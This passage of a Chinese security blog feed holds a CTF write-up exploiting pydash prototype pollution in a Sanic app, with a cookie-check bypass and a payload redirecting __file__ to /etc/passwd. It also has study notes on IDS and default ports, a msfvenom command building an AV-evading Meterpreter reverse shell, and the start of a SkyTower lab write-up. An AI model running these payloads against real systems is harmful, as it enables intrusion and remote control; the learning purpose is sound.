class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from sanic import Sanic</span><br><span class="line">from sanic.response import text, html</span><br><span class="line">from sanic_session import Session</span><br><span class="line">import pydash</span><br><span class="line"># pydash==5.1.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Pollute:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(&quot;/static/&quot;, &quot;./static/&quot;)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def index(request):</span><br><span class="line">    return html(open(&#x27;static/index.html&#x27;).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/login&quot;)</span><br><span class="line">async def login(request):</span><br><span class="line">    user = request.cookies.get(&quot;user&quot;)</span><br><span class="line">    if user.lower() == &#x27;adm;n&#x27;:</span><br><span class="line">        request.ctx.session[&#x27;admin&#x27;] = True</span><br><span class="line">        return text(&quot;login success&quot;)</span><br><span class="line"></span><br><span class="line">    return text(&quot;login fail&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/src&quot;)</span><br><span class="line">async def src(request):</span><br><span class="line">    return text(open(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def admin(request):</span><br><span class="line">    if request.ctx.session.get(&#x27;admin&#x27;) == True:</span><br><span class="line">        key = request.json[&#x27;key&#x27;]</span><br><span class="line">        value = request.json[&#x27;value&#x27;]</span><br><span class="line">        if key and value and type(key) is str and &#x27;_.&#x27; not in key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            return text(&quot;success&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return text(&quot;forbidden&quot;)</span><br><span class="line"></span><br><span class="line">    return text(&quot;forbidden&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def index(request):</span><br><span class="line">    return html(open(&#x27;static/index.html&#x27;).read())</span><br></pre></td></tr></table></figure><p>这是一个装饰器.将下面的函数和指定的URL拼接起来，接受的方法为GET,POST</p><p>async def 是一个异步函数，函数名字为Index,接受一个request值</p><p>return html(open(‘static/index.html’))读取static/index.html的文件并将其内容作为相应返回给客户端。</p><p>解释一下什么是异步，正常的同步就是一个一个的做，做完一个才能进行下一个</p><p>但是异步就是比如<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function cbFn()&#123;</span><br><span class="line">    console.log(&#x27;learnInPro&#x27;);</span><br><span class="line">&#125;, 1000);</span><br><span class="line">console.log(&#x27;sync things&#x27;);</span><br></pre></td></tr></table></figure><br>当js执行到的时候发现是一个异步任务，则会先挂起执行后面的，等到1000ms之后，回调函数cbFn才会执行</p><p>为什么要异步呢，因为js是单线程，效率至上，呵呵</p><p>怎么知道是不是一个异步呢，很简单，看看有么有async def开头，还可通过inspect模块检查一个函数是否异步函数。</p><p>inspect.iscoroutinefunction() 函数可以用于判断一个函数是否为协程函数（包括异步函数）。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&quot;/login&quot;)</span><br><span class="line">async def login(request):</span><br><span class="line">    user = request.cookies.get(&quot;user&quot;)</span><br><span class="line">    if user.lower() == &#x27;adm;n&#x27;:</span><br><span class="line">        request.ctx.session[&#x27;admin&#x27;] = True</span><br><span class="line">        return text(&quot;login success&quot;)</span><br><span class="line">    return text(&quot;login fail&quot;)</span><br></pre></td></tr></table></figure><br>@app.route(“/login”)表示讲这个异步函数绑定到”/login” 路径上的HTTP请求。当客户端发送到 “/login” 的请求时，该函数将被调用。</p><p>user = request.cookies.get(“user”) 从请求的 Cookie 中获取名为 “user” 的值，并将其赋给 user 变量。</p><p>if user.lower() == ‘adm;n’: 检查用户是否为 “adm;n”。这里使用了 lower() 方法将用户输入的值转换为小写，以进行不区分大小写的比较。</p><p>request.ctx.session[‘admin’] = True 如果用户为 “adm;n”，将在请求上下文（request.ctx）的会话（session）中设置 “admin” 键，并将其值设为 True。</p><p>return text(“login success”) 返回一个响应，其中包含文本内容 “login success”。这将作为登录成功的响应发送给客户端。</p><p>return text(“login fail”) 如果用户不是 “adm;n”，则返回一个响应，其中包含文本内容 “login fail”。这将作为登录失败的响应发送给客户端。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/src&quot;)</span><br><span class="line">async def src(request):</span><br><span class="line">    return text(open(__file__).read())</span><br></pre></td></tr></table></figure><p>return text(open(<strong>file</strong>).read())打开当前代码文件（<strong>file</strong> 表示当前文件的路径），并使用 read() 方法读取其内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def admin(request):</span><br><span class="line">    if request.ctx.session.get(&#x27;admin&#x27;) == True:</span><br><span class="line">        key = request.json[&#x27;key&#x27;]</span><br><span class="line">        value = request.json[&#x27;value&#x27;]</span><br><span class="line">        if key and value and type(key) is str and &#x27;_.&#x27; not in key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            return text(&quot;success&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return text(&quot;forbidden&quot;)</span><br></pre></td></tr></table></figure><p>@app.route(“/admin”, methods=[‘GET’, ‘POST’]) 表示将该异步函数绑定到 “/admin” 路径上的HTTP请求，并限定允许的请求方法为 GET 和 POST。当客户端发送到 “/admin” 的 GET 或 POST 请求时，该函数将被调用。</p><p>async def admin(request): 定义了一个异步函数 admin，它接收一个 request 参数，表示HTTP请求对象。</p><p>if request.ctx.session.get(‘admin’) == True: 检查会话中是否存在 ‘admin’ 键，并且其值为 True。这可能是在某个会话管理器中处理用户登录状态的方式。</p><p>key = request.json[‘key’] 从请求的 JSON 数据中获取名为 ‘key’ 的值，并将其赋给 key 变量。</p><p>value = request.json[‘value’] 从请求的 JSON 数据中获取名为 ‘value’ 的值，并将其赋给 value 变量。</p><p>if key and value and type(key) is str and ‘<em>.’ not in key: 检查条件，确保 ‘key’ 和 ‘value’ 非空，且 ‘key’ 的类型为字符串，并且 ‘key’ 中不包含 ‘</em>.’。这是对请求参数的验证。</p><p>pollute = Pollute() 创建一个名为 pollute 的对象，可能是某个类的实例化对象。</p><p>pydash.set<em>(pollute, key, value) 使用 pydash 库中的 set</em> 函数，将 value 设置到 pollute 对象的 key 属性中。这可能是在操作对象的属性赋值。</p><p>return text(“success”) 返回一个响应，其中包含文本内容 “success”。这将作为成功的响应发送给客户端。</p><p>return text(“forbidden”) 如果条件检查不通过，返回一个响应，其中包含文本内容 “forbidden”。这将作为禁止访问的响应发送给客户端。</p><p>所以我们要绕过adm；n的限制，因为这里从session提取，所以会在;进行截断，所以不能直接传，看了师傅的wp说是<strong>RFC2068</strong></p><p>所以我们传cookie:adm\073n即可<br><img src="https://pic.imgdb.cn/item/666ed600d9c307b7e979e2bb.png" alt=""></p><p>在cookie中找到session，<br><img src="https://pic.imgdb.cn/item/666ed62fd9c307b7e97a3eb3.png" alt=""></p><p>我们的目的是污染file使它可以在flag所在的文件下，所以我们先尝试污染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;: &quot;/etc/passwd&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/666ed6b2d9c307b7e97b35e0.png" alt=""></p><p>success，访问/src</p><p><img src="https://pic.imgdb.cn/item/666ed6e8d9c307b7e97b9ff5.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/666edad6d9c307b7e9835301.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/666edafad9c307b7e9839b29.png" alt=""></p><p>后面是需要本地启动sanic去做，但是显然我不会，等我有时间再来研究这个</p><p><del>留个爪</del></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>答题的时候遇到的一些奇奇怪怪的知识点吧</title>
      <link href="/2025/01/08/2024%E5%B9%B44%E6%9C%8825%E6%97%A5-%E4%B8%8D%E7%9F%A5%E9%81%93%E5%86%99%E4%BB%80%E4%B9%88%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/"/>
      <url>/2025/01/08/2024%E5%B9%B44%E6%9C%8825%E6%97%A5-%E4%B8%8D%E7%9F%A5%E9%81%93%E5%86%99%E4%BB%80%E4%B9%88%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="IDS（入侵检测系统）"><a href="#IDS（入侵检测系统）" class="headerlink" title="IDS（入侵检测系统）"></a>IDS（入侵检测系统）</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h3 id="通过位置可以分为："><a href="#通过位置可以分为：" class="headerlink" title="通过位置可以分为："></a>通过<strong>位置</strong>可以分为：</h3><p>NIDS(network-based intrusion detection  system)</p><p>HIDS(Host-based intrusion detection system)</p><h3 id="通过检测的方式可以分为"><a href="#通过检测的方式可以分为" class="headerlink" title="通过检测的方式可以分为"></a>通过<strong>检测</strong>的方式可以分为</h3><h5 id="基于特征"><a href="#基于特征" class="headerlink" title="基于特征"></a>基于特征</h5><ul><li>模式匹配(pattern matching)</li><li>状态匹配(stateful matching)</li></ul><h5 id="基于异常"><a href="#基于异常" class="headerlink" title="基于异常"></a>基于异常</h5><ul><li>基于统计异常</li><li>基于协议异常</li><li>基于流量异常</li><li>规则型或启发型</li></ul><h6 id="NIDS"><a href="#NIDS" class="headerlink" title="NIDS"></a>NIDS</h6><p>用于监控网络流量以检测潜在的入侵行为和安全漏洞</p><p>NIDS主要分为：</p><ul><li>传感器：部署在网络中的硬件设备，负责捕获网络流量并传输给分析引擎。</li><li>分析引擎：对捕获的数据进行解析和检测，发现异常行为或潜在的入侵行为，并生成相应的报警和日志。</li><li>规则集/模式库：预定义的检测规则或模式，用于匹配和检测网络流量中的异常行为。</li><li>管理界面：提供用户界面，方便管理员配置规则、查看报警和日志、管理传感器等。</li></ul><p>NIDS的分析引擎通常基于规则，<strong>可以通过添加自己的规则进行修改</strong></p><p>参考来源:</p><p><a href="https://developer.baidu.com/article/details/3212435">网络入侵检测系统（NIDS）的原理与实践-百度开发者中心 (baidu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/624409778">什么是IDS（Intrusion Detection System）入侵检测系统？都有哪些类型？NIDS、HIDS、基于特征、基于异常等 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/qq_44807756/article/details/128012434">网络入侵检测 Network Intrusion Detection System (NIDS)-CSDN博客</a></p><h6 id="HIDS"><a href="#HIDS" class="headerlink" title="HIDS"></a>HIDS</h6><p>通过监视主机上的日志、文件和进程等活动来检测签字啊的入侵行为并发出警报通知管理员</p><p>HIDS将备份您的配置文件，以便在恶意病毒通过更改计算机的设置而失去系统安全性时，您可以还原设置。您要防止的另一个关键因素是类Unix平台上的root用户访问权限或Windows系统上的注册表更改。 HIDS将无法阻止这些更改，但是它应该能够在发生任何此类访问时提醒您。</p><h5 id="区分"><a href="#区分" class="headerlink" title="区分"></a>区分</h5><p><a href="https://imgse.com/i/pkPPZjO"><img src="https://s21.ax1x.com/2024/04/25/pkPPZjO.png" alt="pkPPZjO.png"></a></p><p>参考来源：</p><p><a href="https://blog.csdn.net/weixin_39512626/article/details/110846155">系列一：HIDS初识-CSDN博客</a></p><p><a href="https://blog.csdn.net/MEIYOUDAO_JIUSHIDAO/article/details/120905677">13款入侵检测系统介绍（HIDS）_主机入侵检测hids-CSDN博客</a></p><h6 id="基于特征匹配"><a href="#基于特征匹配" class="headerlink" title="基于特征匹配"></a>基于特征匹配</h6><p>依赖网络流量或者特定特征的入侵检测技术。包括协议类型、通信模式、流量大小、请求频率等等</p><p><strong>① 标志数据库 :</strong> 维护 已知攻击标志特征 数据库 ;</p><p><strong>② 维护者 :</strong> 由 网络安全专家 维护上述数据库 , 由 网络管理员 操作加入特征到数据库中 ;</p><p><strong>③ 弊端 :</strong> 只能检测已知攻击 , 不能检测未知攻击 ;</p><p><a href="https://blog.csdn.net/shulianghan/article/details/108785482">【计算机网络】网络安全 : 入侵检测系统 ( 基于特征的入侵检测系统 | 基于异常的入侵检测系统 )-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/624409778#:~:text=基于特征匹配的IDS 基于特征的入侵检测系统（Feature-based,IDS）是一种依赖于网络流量或系统行为中特定特征的入侵检测技术。 这些特征可以包括协议类型、通信模式、流量大小、请求频率等。 基于这些特征，入侵检测系统可以识别出潜在的恶意行为和攻击，并采取相应的措施。">什么是IDS（Intrusion Detection System）入侵检测系统？都有哪些类型？NIDS、HIDS、基于特征、基于异常等 - 知乎 (zhihu.com)</a></p><p>基于状态匹配</p><p>一种依赖于网络流量或系统行为中状态转换规律的入侵检测技术。这类IDS分析和跟踪网络通信的状态，以识别出异常或恶意行为。状态匹配方法通过分析网络连接的状态，例如TCP/IP连接的建立、维护和终止，来检测潜在的攻击。通常，这种方法使用有限状态机（FSM）或状态转移图来表示状态之间的转换。</p><h5 id="区分："><a href="#区分：" class="headerlink" title="区分："></a>区分：</h5><p><a href="https://imgse.com/i/pkPP2b4"><img src="https://s21.ax1x.com/2024/04/25/pkPP2b4.md.png" alt="pkPP2b4.md.png"></a></p><h6 id="基于统计异常"><a href="#基于统计异常" class="headerlink" title="基于统计异常"></a>基于统计异常</h6><p>对网络流量和系统行为的统计特性进行建模和分析，以检测异常</p><p>使用了机器学习等，可能存在较高的误报</p><h6 id="基于协议异常"><a href="#基于协议异常" class="headerlink" title="基于协议异常"></a>基于协议异常</h6><p>关注网络协议的异常使用，如协议格式错误、非法指令或未遵循协议规范的行为。通过检查网络流量中的协议数据包，分析是否存在不符合协议规范的情况，从而发现潜在的攻击。</p><p>评价是检测专攻协议的</p><h6 id="基于流量异常"><a href="#基于流量异常" class="headerlink" title="基于流量异常"></a>基于流量异常</h6><p>关注网络流量的异常变化</p><p>专攻流量的</p><h6 id="规则型或启发型"><a href="#规则型或启发型" class="headerlink" title="规则型或启发型"></a>规则型或启发型</h6><p>依赖于预定义的规则集，通常包括已知攻击的特征和行为模式。基于规则的IDS通过匹配网络流量或系统行为与规则集，来检测潜在的攻击。规则集需要不断更新，以保持对最新攻击手段的检测能力。</p><p>只能打已知的，对于0day和未知攻击的检测能力一般</p><h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><p>javaee架构的中间件</p><p>java应用服务器，开设端口是7001（顺便说一句tomcat是8080，但经常被占用就是了）</p><p>参考文章：</p><p><a href="https://www.cnblogs.com/telwanggs/p/7137116.html">weblogic详解 - 疯子110 - 博客园 (cnblogs.com)</a></p><p><a href="https://segmentfault.com/a/1190000007090110">从懵逼到再入门——JavaEE完整体系架构 - 后端开发 - SegmentFault 思否</a></p><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>sql serve默认用户是<strong>sa</strong>，是sa，全名应该是superadminstor</p><p>顺便在一提</p><p>动态脚本的编写的网站容易受到sql注入的漏洞</p><h2 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h2><p>mysql默认端口号是<strong>3306</strong></p><p>Rdids是<strong>6379</strong></p><p>Zookeeper是<strong>2181</strong></p><p>kafka是<strong>9092</strong></p><p>etcd客户端连接端口<strong>2379</strong>，内部互联端口是<strong>2380</strong></p><p>indluxdb用于客户端和服务端交互的HTTP API是<strong>8086</strong>，用于提供备份和恢复的RPC服务是<strong>8088</strong> </p><p>grafana是<strong>3000</strong></p><p>ES节点 和 外部 通讯使用，集群间和TCPClient都走的它，http协议的RESTful接口是<strong>9200</strong>，ES节点之间通讯使用（tcp通讯端口）是<strong>9300</strong></p><p>kibana是<strong>5601</strong></p><p>Consul是<strong>8500</strong></p><p> NSQ(消息队列)：</p><ul><li>nsqd : tcp :<strong>4150</strong> http :<strong>4151</strong></li><li>nsqlookupd : tcp :<strong>4160</strong> http :<strong>4161</strong></li><li>nsqadmin: :<strong>4171</strong></li></ul><p>Ntp:<strong>123</strong><br>测试ntp服务可用性：<br>w32tm /stripchart /computer:ntp_server_address<br>w32tm /stripchart /computer:<strong>192.168.42.133:123</strong></p><p>SSH服务(安全外壳协议)是<strong>22</strong></p><p>Nginx是<strong>80</strong></p><h2 id="网络安全威胁"><a href="#网络安全威胁" class="headerlink" title="网络安全威胁"></a>网络安全威胁</h2><p>题目使用的是主动威胁和被动威胁，我还是第一次听说这样的称呼….</p><p>实际上就是主动攻击和被动攻击</p><p>被动威胁是指那些仅对信息进行非授权泄露而未改变系统状态的威胁，例如信息窃取、密码破译、信息流量分析等。被动威胁不会导致系统状态或信息的任何篡改，但有用的信息可能被盗窃并用于非法目的。主动威胁则是对系统的状态进行故意的非授权改变，例如修改数据、破坏系统功能或造成系统瘫痪等。</p><p><a href="https://imgse.com/i/pkPFFl6"><img src="https://s21.ax1x.com/2024/04/25/pkPFFl6.png" alt="pkPFFl6.png"></a></p><p><a href="https://imgse.com/i/pkPFVmD"><img src="https://s21.ax1x.com/2024/04/25/pkPFVmD.png" alt="pkPFVmD.png"></a></p><p>参考来源：</p><p><a href="https://www.zhihu.com/question/652171623">(5 封私信) 网络安全威胁的主要类型有哪些？如何有效防范？ - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/shulianghan/article/details/108620693">【计算机网络】网络安全 : 计算机网络安全威胁 ( 四种网络攻击类型 | 主动攻击与被动攻击 | 分布式拒绝服务攻击 DDos | 恶意程序 | 计算机网络安全目标)_网络安全攻击的四种形式-CSDN博客</a></p><p>Metasploit</p><p>msfvenom用于生成和编码payload，要对Payload进行编码，可以使用-e参数</p><p>例子:</p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-p windows/meterpreter/reverse_tcp: 指定要生成的 payload 类型为 Meterpreter 反向 TCP shell，用于与 Metasploit 的 multi/handler 模块配合使用。</span><br><span class="line"></span><br><span class="line">LHOST=192.168.1.100: 设置 Meterpreter shell 连接的目标 IP 地址为 192.168.1.100，即攻击者监听的 IP 地址。</span><br><span class="line"></span><br><span class="line">LPORT=4444: 设置 Meterpreter shell 连接的目标端口为 4444，即攻击者监听的端口。</span><br><span class="line"></span><br><span class="line">-f exe: 指定生成的 payload 格式为可执行文件（.exe）。</span><br><span class="line"></span><br><span class="line">-e x86/shikata_ga_nai: 使用 shikata_ga_nai 编码器来对 payload 进行编码。shikata_ga_nai 是 Metasploit 提供的一种多字节编码器，用于绕过入侵检测系统 (IDS) 和防病毒软件的检测。</span><br><span class="line"></span><br><span class="line">-i 5: 设置编码器的迭代次数为 5 次。增加迭代次数可以增强编码的复杂性，提高绕过检测的能力，但也可能会增加 payload 的大小。</span><br><span class="line"></span><br><span class="line">-o payload.exe: 指定生成的 payload 输出到 payload.exe 文件中。</span><br></pre></td></tr></table></figure><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet:"></a>Telnet:</h2><p>缺省情况：系统或软件在未经过用户设置或调整时的默认状态。这个状态通常是系统或软件的初始状态，用户可以根据需要进行自定义或更改。例如，在某些应用程序中，用户可以自定义界面颜色、语言设置或权限设置，但如果用户没有进行任何更改，系统将保持在缺省状态下。</p><p>Telnet是一种不安全的远程登录协议，通信过程是明文传输的不采用加密算法，所以容易受到中间人攻击导致的敏感信息泄露</p><h2 id="Cookie欺骗"><a href="#Cookie欺骗" class="headerlink" title="Cookie欺骗"></a>Cookie欺骗</h2><p>（也就是重放攻击</p><p><img src="https://image.3001.net/images/20210303/1614756021_603f38b591a5d3b5eba25.png!small" alt="image"></p><p>（图片来源：<a href="https://www.freebuf.com/articles/web/264969.html">实战中常见的十种cookie漏洞 - FreeBuf网络安全行业门户</a>，顺便可以看看文章，个人认为写的很清晰了</p><p>cookie知识可以看<a href="https://blog.csdn.net/Y525698136/article/details/131140237">“黑客”入门学习之“Cookie技术详解”_cookie欺骗-CSDN博客</a></p><h2 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h2><p>本地帐户的密钥、帐户启用状态等信息存放在注册表()下各个分支</p><p><img src="https://pic.imgdb.cn/item/662a66950ea9cb14030ade4f.png" alt=""></p><h3 id="active-directory域服务"><a href="#active-directory域服务" class="headerlink" title="active directory域服务"></a>active directory域服务</h3><p><code>Microsfot</code>提供的一项功能服务，它充当集中存储库并存储与<code>Active Directory</code> 用户、计算机、服务器和组织内的其他资源等对象相关的所有数据，它使系统管理员的管理变得容易。但它的主要功能是提供一种在域环境中对用户和机器进行身份验证的方法。使用 <code>Active Directory</code>，可以远程管理用户、工作站及其权限等资源。因此，它是一个可从网络上的任何地方访问的单一管理界面</p><p>（坦白说我并不知道这是个什么东西，先埋个爪子）</p><p><a href="https://zhuanlan.zhihu.com/p/528689453">AD（Active Directory）基础知识 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/ximenjianxue/article/details/101207667">AD中组的分类区别_ad域的全局组 通用组区别-CSDN博客</a></p><p>那条”/etc/ssh/sshd confg”配置项与使用秘钥认证登录无关</p><p>A. StrictModes no </p><p>B.RSAAuthentication yes </p><p>C.MaxStartups 10 </p><p>D.PubkeyAuthentication yes</p><p><strong>StrictModes 用于指定是否检查用户家目录和 .ssh 目录的权限和所有权。RSAAuthentication、MaxStartups 和 PubkeyAuthentication 都与使用密钥认证登录有关。</strong></p><h2 id="经典nmap"><a href="#经典nmap" class="headerlink" title="经典nmap"></a>经典nmap</h2><p><a href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap详细使用教程_nmap使用教程-CSDN博客</a></p><p>自己看得了（反正也没人看</p><p>企业无线安全加密认证</p><p>PEAP-MSV2（Protected Extensible Authentication Protocol with Microsoft Challenge Handshake Authentication Protocol version 2）：PEAP-MSV2 是一种基于 EAP（Extensible Authentication Protocol）的认证方法，通过在 TLS（Transport Layer Security）通道中传输 EAP 数据来确保身份验证的安全性。MS-CHAPv2（Microsoft Challenge Handshake Authentication Protocol version 2）用于在 PEAP 会话中进行身份验证。这种方法常用于企业环境中，因为它提供了一种安全的身份验证机制，可以防止中间人攻击。</p><p>RC4（Rivest Cipher 4）：RC4 是一种对称加密算法，曾经被广泛用于加密无线网络的流量。然而，由于其存在严重的安全漏洞，包括被称为“密钥恢复攻击”的问题，RC4 已经被废弃，不再被认为是安全的加密算法。</p><p>RSA（Rivest-Shamir-Adleman）：RSA 是一种非对称加密算法，通常用于数字签名和密钥交换。在企业无线安全中，RSA 主要用于建立安全通信通道和进行身份验证。</p><p>WPA-PSK（Wi-Fi Protected Access Pre-Shared Key）：WPA-PSK 是一种基于预共享密钥的无线网络加密认证方法。在这种方法中，所有连接到同一网络的设备使用相同的预共享密钥进行加密和解密。尽管相对于其他方法（如 WPA-Enterprise）来说安全性稍低，但 WPA-PSK 仍然是一种简单而有效的企业无线安全加密认证方法，适用于小型企业或家庭网络。</p><p>先写到这吧，挺多内容的懒得写了，接着埋爪子…..</p>]]></content>
      
      
      
        <tags>
            
            <tag> 奇奇怪怪,IDS, </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>skytower</title>
      <link href="/2025/01/08/2024%E5%B9%B412%E6%9C%8812%E6%97%A5-SkyTower-1/"/>
      <url>/2025/01/08/2024%E5%B9%B412%E6%9C%8812%E6%97%A5-SkyTower-1/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>上来永远是经典的nmap扫描端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sS -sV -A -T5 -p- 192.168.199.138</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 14:03 CST</span><br><span class="line">Nmap scan report for 192.168.199.138</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE    VERSION</span><br><span class="line">22/tcp   filtered ssh</span><br><span class="line">80/tcp   open     http       Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">3128/tcp open     http-proxy Squid http proxy 3.1.20</span><br><span class="line">|_http-title: ERROR: The requested URL could not be retrieved</span><br><span class="line">|_http-server-header: squid/3.1.20</span><br><span class="line">MAC Address: 00:0C:29:3E:4A:30 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.12 ms 192.168.199.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 51.04 seconds</span><br></pre></td></tr></table></figure><p>开放了22端口可以尝试ssh链接，开放了80端口可能有页面收集信息环节，3128端口是squid-http是一个代理端口<br>ssh还是filtered状态，我们可以利用squid-http代理做端口转发开启 ssh</p><p>访问192.168.199.138,发发现是一个登录框</p><p>对于登录框<br>我们的方法可以有<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sql注入</span><br><span class="line">暴力破解</span><br><span class="line">cms框架漏洞</span><br><span class="line">插件漏洞</span><br><span class="line">数据库+中间件+框架</span><br></pre></td></tr></table></figure></p><p><img src="https://pic.imgdb.cn/item/675a9fe9d0e0a243d4e2bd69.png" alt=""></p><p><strong>nikto</strong>  可以看一下网站的东西<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 